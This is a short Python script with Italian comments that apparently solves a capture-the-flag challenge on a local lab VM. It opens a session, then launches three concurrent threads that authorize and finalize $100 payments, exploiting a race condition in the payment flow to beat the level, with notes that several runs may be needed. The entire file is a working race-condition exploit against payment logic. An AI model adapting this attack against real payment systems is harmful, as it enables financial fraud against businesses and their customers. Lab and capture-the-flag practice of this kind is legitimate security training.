import requests
import threading

#inserisci l'ip della VM
create_user_url = 'http://192.168.56.106/new_account.php' 
authorize_payment_url = 'http://192.168.56.106/authorize_payment.php'
finalize_payment_url = 'http://192.168.56.106/finalize_payment.php'

session = requests.Session()
response_create_user = session.get(create_user_url)

def process_payment(amount):
    params = {'amount': amount}
    response_authorize = session.get(authorize_payment_url, params=params)
    
    if "Payment authorized with ID" in response_authorize.text:
        payment_id = response_authorize.text.split("Payment authorized with ID ")[1].split(".")[0]
        finalize_params = {'id': payment_id}
        response_finalize = session.get(finalize_payment_url, params=finalize_params)
        print(response_finalize.text)
    else:
        print("Authorization failed:", response_authorize.text)

#ci bastano 3 transazioni da $100 per completare la sfida.
num_transactions = 3
amount_per_transaction = 100
threads = []

for _ in range(num_transactions):
    t = threading.Thread(target=process_payment, args=(amount_per_transaction,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

response_main_page = session.get("http://192.168.56.106/")
print(response_main_page.text)
print("All transactions completed.")

#### N.B - Lo script potrebbe richiedere più esecuzioni per funzionare. ###
#### Nel caso in cui la print a riga 38 restituisca l'html del livello 2 allora il livello è superato. ###
